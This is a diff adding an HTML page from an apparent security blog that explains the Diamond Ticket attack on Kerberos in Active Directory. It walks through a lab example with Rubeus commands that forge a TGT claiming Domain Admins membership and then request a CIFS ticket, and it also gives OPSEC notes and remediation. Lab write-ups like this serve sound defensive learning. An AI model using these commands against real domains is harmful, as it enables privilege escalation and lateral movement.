@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Diamond Ticket Attack | Faisal Alhumaid</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="icon" type="image/png" href="/assets/images/favicon-32.png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/assets/images/favicon-192.png">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/css/style.css" />
+  <link rel="stylesheet" href="/assets/css/article.css" />
+  <link rel="stylesheet" href="/assets/css/image-viewer.css" />
+</head>
+
+<body>
+
+<div id="navbar-root"></div>
+
+<main class="article-main">
+
+  <div class="article-content">
+
+    <nav class="article-breadcrumb">
+      <a href="/">Home</a> /
+      <a href="/articles/articles-hub.html">Articles Hub</a> /
+      <span>Diamond Ticket Attack</span>
+    </nav>
+
+    <header class="article-header">
+      <h1>Diamond Ticket Attack – Forging Kerberos TGTs</h1>
+      <div class="article-meta">
+        <span><strong>Artifact:</strong> Kerberos Tickets (TGT / TGS)</span>
+        <span><strong>Platform:</strong> Windows / Active Directory</span>
+        <span><strong>Category:</strong> Authentication &amp; Lateral Movement</span>
+      </div>
+    </header>
+
+    <div class="article-back">
+      <a href="/articles/articles-hub.html">← Back to All Articles</a>
+    </div>
+
+    <section>
+      <h2>1. Overview</h2>
+      <p>
+        Diamond Ticket attacks allow an attacker to forge Kerberos Ticket Granting Tickets (TGTs)
+        that appear legitimate to the domain controller. Once a valid TGT is forged, it can be used
+        to request service tickets and access resources with elevated privileges.
+      </p>
+      <p>
+        If an adversary has the KRBTGT account password hash, they can create and sign their own TGTs.
+        Any ticket properly signed with this key will be treated as valid.
+      </p>
+    </section>
+
+    <section>
+      <h2>2. How Kerberos Authentication Works</h2>
+      <p>Kerberos uses tickets to authenticate users in Active Directory.</p>
+
+      <ul class="section-list">
+        <li>Domain Controller (KDC): Issues and validates tickets.</li>
+        <li>Ticket Granting Ticket (TGT): Used to request service tickets.</li>
+        <li>Ticket Granting Service (TGS): Issues tickets for services like CIFS or HTTP.</li>
+      </ul>
+
+      <figure class="article-figure">
+        <img src="/assets/images/articles/diamond-ticket/image1.png" class="click-img" alt="Kerberos workflow diagram" />
+        <figcaption>Figure 1 – Kerberos Authentication Workflow</figcaption>
+      </figure>
+    </section>
+
+    <section>
+      <h2>3. The KRBTGT Account &amp; Diamond Ticket Theory</h2>
+      <p>The KRBTGT account stores the secret key used to encrypt and validate TGTs.</p>
+
+      <ul class="section-list">
+        <li>Encrypts and signs TGTs.</li>
+        <li>Validates incoming TGTs.</li>
+      </ul>
+
+      <p>Diamond Ticket attacks modify a legitimate TGT then re-sign it using the KRBTGT hash.</p>
+    </section>
+
+    <section>
+      <h2>4. Lab Setup – Practical Diamond Ticket Example</h2>
+
+      <table>
+        <thead>
+          <tr><th>Hostname</th><th>Type</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Hogwarts-DC.falhumaid.local</td><td>Domain Controller</td></tr>
+          <tr><td>Windows10-Lab.falhumaid.local</td><td>Workstation</td></tr>
+        </tbody>
+      </table>
+
+      <figure class="article-figure">
+        <img src="/assets/images/articles/diamond-ticket/image2.png" class="click-img" alt="Access denied to C$" />
+        <figcaption>Figure 2 – Low-Privilege User Access Denied</figcaption>
+      </figure>
+    </section>
+
+    <section>
+      <h2>5. Building the Diamond Ticket with Rubeus</h2>
+
+      <pre><code>C:\Users\lowpriv\Tools&gt; Rubeus.exe diamond
+/krbkey:93d0770b7daf24...
+/user:lowpriv
+/password:Adm!n10
+/domain:falhumaid.local
+/dc:hogwarts-dc.falhumaid.local
+/ticketuser:hpotter
+/ticketuserid:1104
+/groups:512
+/nowrap</code></pre>
+
+      <figure class="article-figure">
+        <img src="/assets/images/articles/diamond-ticket/image3.png" class="click-img" alt="Rubeus diamond attack" />
+        <figcaption>Figure 3 – Rubeus Diamond Ticket</figcaption>
+      </figure>
+    </section>
+
+    <section>
+      <h2>6. Requesting a Service Ticket</h2>
+
+      <pre><code>C:\Users\lowpriv\Tools&gt; Rubeus.exe asktgs
+/ticket:doIFwjCCBb...
+/service:cifs/hogwarts-dc.falhumaid.local
+/ptt
+/nowrap</code></pre>
+
+      <figure class="article-figure">
+        <img src="/assets/images/articles/diamond-ticket/image4.png" class="click-img" alt="Rubeus asktgs" />
+        <figcaption>Figure 4 – Requesting CIFS TGS</figcaption>
+      </figure>
+
+      <figure class="article-figure">
+        <img src="/assets/images/articles/diamond-ticket/image5.png" class="click-img" alt="Successful C$ access" />
+        <figcaption>Figure 5 – Successful Access</figcaption>
+      </figure>
+
+    </section>
+
+    <section>
+      <h2>7. OPSEC Advantages</h2>
+
+      <ul class="section-list">
+        <li>Diamond Tickets start from a legitimate TGT.</li>
+        <li>Golden Tickets are made completely offline.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>8. Remediation</h2>
+
+      <ul class="section-list">
+        <li>Reset KRBTGT password twice.</li>
+        <li>Monitor DCSync activity.</li>
+        <li>Alert abnormal ticket usage.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>9. References</h2>
+      <ul class="section-list">
+        <li><a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus GitHub</a></li>
+        <li><a href="https://www.trustedsec.com/blog/a-diamond-in-the-ruff" target="_blank">A Diamond in the Ruff</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1558/" target="_blank">MITRE Steal or Forge Tickets</a></li>
+      </ul>
+    </section>
+
+  </div>
+
+</main>
+
+<div id="footer-root"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+<script src="/assets/js/scramble.js"></script>
+<script src="/assets/js/nav-active.js"></script>
+<script src="/assets/js/article-toc.js"></script>
+<script src="/assets/js/article-progress.js"></script>
+<script src="/assets/js/load-navbar.js"></script>
+<script src="/assets/js/load-footer.js"></script>
+<script src="/assets/js/image-viewer.js"></script>
+
+</body>
+</html>
